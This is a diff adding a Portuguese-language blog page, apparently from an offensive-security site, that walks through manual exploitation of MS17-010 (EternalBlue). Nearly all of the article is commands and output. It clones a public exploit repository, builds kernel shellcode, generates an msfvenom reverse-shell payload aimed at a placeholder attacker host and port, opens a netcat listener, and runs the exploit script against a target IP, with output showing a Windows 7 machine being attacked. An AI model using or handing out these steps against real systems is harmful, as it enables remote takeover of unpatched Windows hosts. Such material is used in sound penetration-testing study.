@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<!-- iOS Safari -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- Chrome, Firefox OS and Opera Status Bar Color -->
+<meta name="theme-color" content="#FFFFFF">
+<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
+<link rel="stylesheet" type="text/css"
+  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
+<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
+<link rel="stylesheet" type="text/css" href="css/theme.css">
+<link rel="stylesheet" type="text/css" href="css/notablog.css">
+<!-- Favicon -->
+
+<style>
+  :root {
+    font-size: 20px;
+  }
+</style>
+  <title>MS17-010 - Exploiting Manually&nbsp;|&nbsp;www.offensivethink.com</title>
+  <meta property="og:type" content="blog">
+  <meta property="og:title" content="MS17-010 - Exploiting Manually">
+  
+    <meta name="description" content="Como explorar a vulnerabilidade MS17-010 (Ethernalblue/DoublePusar) de forma manual. ">
+    <meta property="og:description" content="Como explorar a vulnerabilidade MS17-010 (Ethernalblue/DoublePusar) de forma manual. ">
+  
+  
+  <style>
+    .DateTagBar {
+      margin-top: 1.0rem;
+    }
+  </style>
+</head>
+
+<body>
+  <nav class="Navbar">
+  <a href="index.html">
+    <div class="Navbar__Btn">
+      
+      <span>Home</span>
+    </div>
+  </a>
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+      <span class="Navbar__Delim">&centerdot;</span>
+      <a href="referencia-rapida.html">
+        <div class="Navbar__Btn">
+          
+          <span>→ Referência rápida ← </span>
+        </div>
+      </a>
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+  
+    
+      <span class="Navbar__Delim">&centerdot;</span>
+      <a href="contacts.html">
+        <div class="Navbar__Btn">
+          
+            <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F12e48681-f6a0-41cb-aa1f-73a46f35c5d3%2FOffensiveThink_Logo_Negative_notion_-_280x280.png?table=block&amp;id=ca933149-5245-4511-a885-9cf5922808e1"></span>&nbsp;
+          
+          <span>about &amp; contacts</span>
+        </div>
+      </a>
+    
+  
+    
+      <span class="Navbar__Delim">&centerdot;</span>
+      <a href="offensivetools.html">
+        <div class="Navbar__Btn">
+          
+          <span>Offensive Tools</span>
+        </div>
+      </a>
+    
+  
+    
+  
+</nav>
+  <header class="Header">
+    
+    <div class="Header__Spacer Header__Spacer--NoCover">
+    </div>
+    
+    <h1 class="Header__Title_post">MS17-010 - Exploiting Manually</h1>
+    
+      <div class="DateTagBar">
+        
+          <span class="DateTagBar__Item DateTagBar__Date">Posted on Fri, Jul 1, 2022</span>
+        
+        
+          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--pink">
+            <a href="tag/windows.html">windows</a>
+          </span>
+        
+      </div>
+    
+  </header>
+  <article id="https://www.notion.so/4d303b22f43847f2b58b72560068aced" class="PageRoot"><div id="https://www.notion.so/a7f246d5867340aeb26c6183717839d7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Abaixo um passo a passo para exploração da vulnerabilidade MS17-010 (EternalBlue/DoublePulsar).</span></span></p></div><div id="https://www.notion.so/ebaa8d925f0b40d1884e160b7a0ea590" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Utilizaremos os exploits do repositório: https://github.com/worawit/MS17-010.git</span></span></p></div><div id="https://www.notion.so/41662fe7dddd42709d7fecf624ecfb37" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><ol class="NumberedListWrapper"><li id="https://www.notion.so/c799a4f4035b413ea742eb3d820d3094" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString">Clonando o Repositório</span></span></li></ol><pre id="https://www.notion.so/90b2f976a50546128cc5efae3b9a7f6a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>root@kali<span class="token comment"># git clone https://github.com/worawit/MS17-010.git</span>
+Cloning into <span class="token string">'MS17-010'</span><span class="token punctuation">..</span>.
+remote: Enumerating objects: <span class="token number">183</span>, done.
+remote: Total <span class="token number">183</span> <span class="token punctuation">(</span>delta <span class="token number">0</span><span class="token punctuation">)</span>, reused <span class="token number">0</span> <span class="token punctuation">(</span>delta <span class="token number">0</span><span class="token punctuation">)</span>, pack-reused <span class="token number">183</span>
+Receiving objects: <span class="token number">100</span>% <span class="token punctuation">(</span><span class="token number">183</span>/183<span class="token punctuation">)</span>, <span class="token number">113.61</span> KiB <span class="token operator">|</span> <span class="token number">391.00</span> KiB/s, done.
+Resolving deltas: <span class="token number">100</span>% <span class="token punctuation">(</span><span class="token number">102</span>/102<span class="token punctuation">)</span>, done.</span></span></span></code></pre><ol class="NumberedListWrapper"><li id="https://www.notion.so/5b76cbf5072a4af5ae648bb9e5471f9b" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString">Gerando o Payload (Atenção para a plataforma a ser atacada, 64 ou 32 bits)</span></span></li></ol><pre id="https://www.notion.so/82fcdbaac4614e5188ef349932803181" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>root@kali<span class="token comment"># nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o \</span>
+           ./sc_x64_kernel.bin</span></span></span></code></pre><ol class="NumberedListWrapper"><li id="https://www.notion.so/c3863b7e88c34a6cac242b7e432af774" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString">Shellcode (Atenção para a plataforma a ser atacada, 64 ou 32bits)</span></span></li></ol><pre id="https://www.notion.so/bf1974106b4e412c86180bf123579eaf" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>
+root@kali<span class="token comment"># msfvenom -p windows/x64/shell_reverse_tcp LPORT=&lt;PORTA_NC_ATACANTE> \</span>
+           <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token operator">&lt;</span>IP_NC_ATACANTE<span class="token operator">></span> <span class="token punctuation">\</span>
+           --platform windows -a x64 --format raw -o sc_x64_payload.bin
+No encoder or badchars specified, outputting raw payload
+Payload size: <span class="token number">460</span> bytes
+Saved as: sc_x64_payload.bin</span></span></span></code></pre><ol class="NumberedListWrapper"><li id="https://www.notion.so/d7c7bec704ae4d5790a04dd60e1354e5" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString">Juntando o Payload e o Shellcode</span></span></li></ol><pre id="https://www.notion.so/ee20d22937594a16a35864e3a93800a0" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>root@kali<span class="token comment"># cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin</span></span></span></span></code></pre><ol class="NumberedListWrapper"><li id="https://www.notion.so/ba79d9d5d0084c149d47cb5619401352" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString">Explorando</span></span><ol class="NumberedListWrapper"><li id="https://www.notion.so/a1448e387fce4e4b99d5e70f1cf07e8b" class="NumberedList" value="1"><span class="SemanticStringArray"><span class="SemanticString">Em um Terminal abrir o Listener na porta escolhida do Reverse Shell acima</span></span></li></ol><div id="https://www.notion.so/4760923f6e554865bd200f144a27fc8b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"> </span></span></p></div><pre id="https://www.notion.so/67573bbb6b294b489c5fe353593e6a51" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>root@kali<span class="token comment"># nc -lnvp &lt;PORTA_NC_ATACANTE></span></span></span></span></code></pre><div id="https://www.notion.so/56c9ad0cd9c9464aa718fb89398e2928" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">b. executar o exploit</span></span></p></div><pre id="https://www.notion.so/f150e4ce9b8b44ec825d9d57008c414f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>root@kali<span class="token comment"># python MS17-010/eternalblue_exploit7.py &lt;IP_MAQUINA_ALVO> sc_x64.bin</span>
+shellcode size: <span class="token number">1232</span>
+numGroomConn: <span class="token number">13</span>
+Target OS: Windows <span class="token number">7</span> Professional <span class="token number">7601</span> Service Pack <span class="token number">1</span>
+SMB1 session setup allocate nonpaged pool success
+SMB1 session setup allocate nonpaged pool success
+good response status: INVALID_PARAMETER
+<span class="token keyword">done</span></span></span></span></code></pre></li></ol><div id="https://www.notion.so/55cb742d92bf4fc48f607a668019b943" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1ed6b3b81550485d9a272e33bcde8d84" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Abaixo segue algumas referências que utilizei e podem ser de ajuda:</span></span></p></div><div id="https://www.notion.so/ac101372a973499a967aacd849b3c8b0" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div></div><div id="https://www.notion.so/3bd0261ee0ff4f1cbc2c1ea51feb3105" class="Bookmark"><a href="https://root4loot.com/post/eternalblue_manual_exploit/"><h5 class="Bookmark__Title">MS17-010 EternalBlue Manual Exploitation</h5><p class="Bookmark__Desc">In this post we&#x27;ll see how EternalBlue (MS17-010) can be exploited manually by compiling the payload from source and running it against a vulnerable target. This is useful in situations where Metasploit is not available or not an option, like running quick demos or exploiting from C2 hosts.</p><p class="Bookmark__Link">https://root4loot.com/post/eternalblue_manual_exploit/</p></a></div><div id="https://www.notion.so/c210aa18d7244401a13b0b295e158a16" class="Bookmark"><a href="https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/"><h5 class="Bookmark__Title">Exploiting MS17-010 without Metasploit (Win XP SP3)</h5><p class="Bookmark__Desc">In some ways this post is an aberration, I had intended to look do a post on exploiting the infamous MS08-067 without Metasploit but did not manage to get my hands on a Win XP VM with that vulnerability. This was after I was trying to do a PTP lab but was burning too many...</p><p class="Bookmark__Link">https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/</p></a></div><div id="https://www.notion.so/f5f6990c74994d6bb2c4a35fc36a13df" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div></article>
+  <footer class="Footer">
+  <div>&copy; www.offensivethink.com 2019-2021</div>
+  <div>&centerdot;</div>
+  <div>Powered by <a href="https://github.com/dragonman225/notablog" target="_blank"
+      rel="noopener noreferrer">Notablog</a>.
+  </div>
+</footer>
+</body>
+
+</html>
